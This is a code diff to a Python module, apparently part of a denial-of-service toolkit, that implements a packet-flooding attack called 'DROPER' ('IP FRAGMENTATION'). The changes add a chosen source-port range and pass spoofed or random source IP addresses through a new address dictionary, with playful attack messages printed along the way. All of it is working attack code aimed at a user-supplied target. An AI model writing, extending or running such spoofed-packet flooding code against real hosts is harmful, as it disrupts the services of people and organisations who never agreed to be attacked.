@@ -30,12 +30,19 @@ def randInt():
     x = random.randint(1,65535) # TCP ports
     return x
 
-def droperize(ip, sport, rounds, source_ip = None):
+def randPort(start, end):
+    x = random.randint(start, end)
+    return x
+
+def droperize(ip, sport, rounds, address_dict):
     n=0
     try:
         for x in range (0,int(rounds)):
             n=n+1
-            s_zombie_port = randInt() 
+            if address_dict['start'] is not None and address_dict['end'] is not None:
+                s_zombie_port = randPort(int(address_dict['start']), int(address_dict['end']))
+            else:
+                s_zombie_port = randInt() 
             IP_p = IP()
             IP_p.src = randIP()
             try:
@@ -43,12 +50,12 @@ def droperize(ip, sport, rounds, source_ip = None):
             except:
                 print("[Error] [AI] [DROPER] Imposible to resolve IP from 'target' -> [Aborting!]\n")
                 break
-            if source_ip is None:
+            if address_dict['source'] is None:
                 print("[Info] [DROPER] Using random source IP")
                 IP_p.src = randIP()
             else:
                 print("[Info] [DROPER] Using given source IP")
-                IP_p.src = source_ip
+                IP_p.src = address_dict['source']
             TCP_l = TCP()
             TCP_l.sport = s_zombie_port
             TCP_l.dport = sport
@@ -66,7 +73,7 @@ def droperize(ip, sport, rounds, source_ip = None):
         print("[Error] [AI] [DROPER] Failing to engage... -> Is still target online? -> [Checking!]")
 
 class DROPER(object):
-    def attacking(self, target, rounds, source = None):
+    def attacking(self, target, rounds, address_dict):
         print("[Info] [AI] 'IP FRAGMENTATION' (DROPER) is ready to fire: [" , rounds, "deuterium bosons ]")
         if target.startswith('http://'):
             target = target.replace('http://','')
@@ -90,4 +97,4 @@ class DROPER(object):
         if ip == "127.0.0.1" or ip == "localhost":
             print("[Info] [AI] [DROPER] Sending message '1/0 %====D 2 Ur ;-0' to 'localhost' -> [OK!]\n")
             return
-        droperize(ip, sport, rounds, source) # attack with DROPER using threading
+        droperize(ip, sport, rounds, address_dict) # attack with DROPER using threading
